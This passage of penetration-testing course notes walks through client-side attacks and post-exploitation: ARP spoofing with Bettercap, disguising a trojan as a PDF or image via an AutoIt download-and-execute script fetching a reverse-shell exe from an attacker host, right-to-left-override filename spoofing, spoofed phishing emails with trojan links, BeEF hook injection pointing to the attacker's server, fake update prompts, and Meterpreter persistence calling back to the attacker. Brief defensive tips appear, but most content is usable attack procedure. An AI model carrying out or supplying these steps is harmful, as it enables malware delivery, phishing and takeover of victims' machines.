  5. Start arp spoofing.  
      - Bettercap -Tq -M arp:remote -i [interface] /[Gatewaay IP]// /Target IP/
  6. When done reset ip tables rules. > ./flushiptables.sh

## Protection against : Client Side Attacks

- Ensure you're not being MITMed -> use trusted network, xarp etc
- Only download from https pages
- check file MD5 after download:
  - <http://www.winmd5.com/>

## Gaining access : Client Side Attacks - Social Engineering

- with previous Client Side attacks you need to be MITM to gain access
- With social engineering you can get attack remotely
- Gather Info about the user(s)
- Build a strategy based on the information
- Build a backdoor based on the info

## Maltego - Information Gathering Tool

- Maltego is an information gathering tool that can be used to collect information about ANYTHING
- Target can be website, company, person etc
- Discover entities associated with targets
- Display info on a graph
- **Come up with an attack strategy**
- To run maltego type the following in terminal :
  - > maltego
- register with email
- you can add(install) transformers (these are plugin that allow you gather information about specific things)
- in new project:
  - entities (left pane)
  - you can add domains, MX record, websites, person, URLs etc (drag and drop entity to main page)
  - you can add social Networks
  - fill the details in right block (property view)
  - entities -> manage entities -> add entities -> advance settings -> add palette item (like twitter)
- Fix Maltego 4.0 Not Starting : <https://www.youtube.com/watch?v=6MaidZjmbjk&feature=youtu.be>

## Backdooring any file type (images, pdf etc)

- Combine backdoor with any file - Generic solution.
- Users are more likely to run a pdf, image or audio file than an executable.
- Works well with social engineering.
- The idea is to convert the original (pdf, jpg, mp3) file to an exe, then combine it with a backdoor using veil-evasion.
  1. Download Autoit from <https://www.autoitscript.com/site/autoit/downloads/>
  2. Install it. > wine [downloaded file]
  3. Download the run script from resources : **autoit-download-and-execute.txt** (rename file Extension from .txt. to .au3)
  4. Place original file in the same directory as the script.
  5. Set original file name in the script.
  6. set url1 to file like jpg (online accessible) file url nad url2 -> path of exe (online accessible)
      - ex: $urls = "http://www.somedomain.com/da/picture.jpg,http://10.20.14.213:/files/rev_https_8080.exe"
  7. Generate exe using Autoit script to exe converter.
  8. Tool : Aut2Exe  -> select script, executable and icon
  9. before downloading from client side, start listening connection using metasploit :
  - **see : Listening for connections : Run hander**

## Spoofing backdoor extension

- Change extension of the trojan from exe to a suitable one.
- Make the trojan even more trustable.
- We will use an old trick using the “right to left overload” character.
  1. Open up the character map.
  2. Go to find.
  3. Search for U+202E
  4. Copy character.
  5. Rename trojan and in the following format -> trojan[RTLO]fdp.exe
    (Where RTLO is the copied character and “fdp” is the reverse of the extension that you want to use.)
  6. it will become : trojan[RTLO]fdp.exe --> trojanexe.pdf
- archive the file so that browser will not replace RTLO character

## Spoofing Emails Method 1- setting up SMTP server (Trojan delivery method)

- objective:
  - Use gathered info to contact target.
  - Send an email pretending to be a friend.
  - Ask them to open a link, download a program
  - Support member -> ask to login to control panel using fake login page
  - Support member -> ask to run a command on Server
  - Ask to visit a normal web pages etc
- information gathering is very important here
- see online "**spoof emails online**", problem with these that the email from these sites end up in spam folder of user
- Sign up to be SMTP web server, will give better results
  - ex: www.sendinblue.com
- Kali Program can be used to send email via SMTP server : **sendemail**

```txt
 > sendemail --help
 > sendemail -xu USERNAME -xp PASSWORD -s SERVER:PORT -f SEND_EMAIL_FROM_THIS_USER_EMAIL_ID -t SEND_TO_THIS_EMAIL_ID -u SUBJECT -m TEXT_MESSAGE_WITH_LINK_TO_TROJAN
 # Trojan can be uploaded to dropbox for downloading
 Note: modify dropbox download file url and put dl=1 in place of dl=0 at the end of url
 to download file directly
 > use advance option --->  -o message-header="From: FIRST_NAME SECOND_NAME <NAME@email.com>"
 to message to look like sent from actual user
```

## Spoofing Emails Method 2

- web hosting platform . ex: 000webhost.com
- setup account
- upload file : mailer.php (added in repository)
- view php file
- fill form and submit

## BeEF : Browser exploitation Framework

- Browser exploitation Framework allowing us to launch a number of attacks on a hooked target
- targets are hooked once they load a hook url
  - DNS spoof requests to a page containing the hook code ```(<script>)```
  - Inject the hook in browsed pages (need to be MITM)
  - Use XSS exploit
    - Social Engineer the target to open a hook page
- start with: **beef start**
- first time it will ask to set a password for default user
- use credentials:
  - username: beef
  - password : set by user
- online browser : hooked to beef right now (you can control)
- offline browser : browsers previously connected
- to browser to get hook, specific javascript code need to executed
  - can be seen on beef console
  - hook code is : ```<script src="http://127.0.0.1;3000/hook.js"></script>```
- work against all browser that runs Javascript
- example:

  ```txt
  paste hook code in /var/www/html/index.html
  replace the localhost address with the address of Hacker machine
  if somebody access Hacker ip address, it'll have a web server running on it which will execute index.html file
  # start web server
  > service apache2 start
  access hackers ip address from victim's browser
  ```

- Command tab that will be used to execute beef commands
- xxRays shows XSS vulnerability

## BeEF : Hooking Targets with Bettercap

- keep beef running
- create inject_beef.js with following code

```js
var imported = document.createElement('script');
imported.src = 'http://YourIP:3000/hook.js';
document.head.appendChild(imported);
```

- update yourIP
- use script to perform javascript injection attack (update in hstshijack)
- in hstshijack.cap
  - set hstshijack.payloads   *:/full_path_of_of_inject_beef.js
- perform MITM with hstshijack and inject js using bettercap
- **BeEF : Running basic commands on target**
- search or lookup commands in Commands tab in beef
- Raw JavaScript: runs any javascript code
- SpyderEye : screenshot of target computer
- Redirect Browser : redirect to your machine to download exploits
- ***Social Enginneering Plugins > Pretty Theft > Facebook***

## BeEF : Hacking Windows 10 using Fake update prompt

- Command > Social Engineering > Fake Notification Bar (Browser)
- GIVE PLUGIN URL : yourIP/file_path.exe
- Notification message
- Execute
- Start Listening on port exploit will make reverse connection on

## Analysing trojans

- Check properties of the file. (jpg, pdf etc)
- Is it what it seems to be?
- Resource Manager > Netowrk Tab > TCP connections > check process name, remote address and port, remote address is hacker ip (look up reverse DNS of IP address)
- Run the file in a virtual machine and check resources.
- Use an online Sandbox service. > <https://www.hybrid-analysis.com/>
- sandbox runs application in controlled environment and check if application do any suspicious activity like making connections to a port to another ip

## Gaining Access outside the Local Network

- all thing remian same, just configure your router to listen to requests and forward to machine on port that you are listening on
- give ip of your router to target/victim
- use veil-evasion to create backdoor, give your public IP(router IP, search google myIP to get public IP) as LHOST
- put backdoor in /var/www/html (and run apache web server)
- start listening to connections on LPORT using exploit/multi/handler
  - LHOST : local IP address (private IP)
  - LPORT : listening port
- enable port forwarding on router
- router setting : 192.168.0.1
- look for something like IP FOrwarding/ virtual Network  etc to enable forwarding
- give public port and target port
- give target IP, hacker machine IP
- **Using BeEF outside of network**
- update public IP in inject_beef.js (section: Hooking Targets with Bettercap)
- port forwarding on router for port 3000 (beEF listens on port 3000)
- send request from machine on different network to your publicIP and 3000 port
- ***DMZ Address*** : forward all the ports to given IP address

# Post Exploitation

- Things can do after gaining access by any method
- first get a meterpreter session (using client Side or server side attacks)
- you could:
  - maintain your access after target removes vulnerable program
  - download, upload, read files
  - start keylogger
  - take screenshot
  - user target machine as Pivot

## Meterpreter Basics

> help - shows help
> background - backgrounds current session.
> sessions -l - lists all sessions.
> sessions -i - interact with a certain session.
> sysinfo - displays system info.
> ipconfig - displays info about interfaces.
> getuid - shows current user
> ps - all the process running on target computer

- migrate to a process that is less likely to be closed like explorer.exe

```bash
migrate explorer_process_id
```

- **File System Commands**

> pwd - shows current working directory
> ls - lists files in the current working directory.
> cd [location] - changes working directory to [location].
> cat [file] - prints the content of [file] on screen.
> download [file] - downloads [file].
> upload [file] - uploads [file].
> execute -f [file] - executes [file].
> shell - Drop into a system command shell (command prompt of windows)
***PS: for more commands run > help***

## Maintaining Access

- we loose connection as target computer restarts machine when we use normal backdoor
- **Using a veil-evasion**
  - Rev_http_service
  - Rev_tcp_service
  - Use it instead of a normal backdoor.
  - Or upload and execute from meterpreter
  - Does not always work
- **Using persistence module**
  - *run persistence -h*  inside meterpreter(comes with meterpreter)
  - run persistence -U -i 20 -p 80 -r your_ip_address
  - *Detectable by antivirus programs*
  - it tries to connect after specified time to given address
- **Using metasploit + veil-evasion → More robust + undetectable by Antivirus**
  > use exploit/windows/local/persistence
  > set session [session id]    --> session on which handler is running
  > set exe::custom [backdoor location]       --> available in advance option : 'show advance'
  > exploit
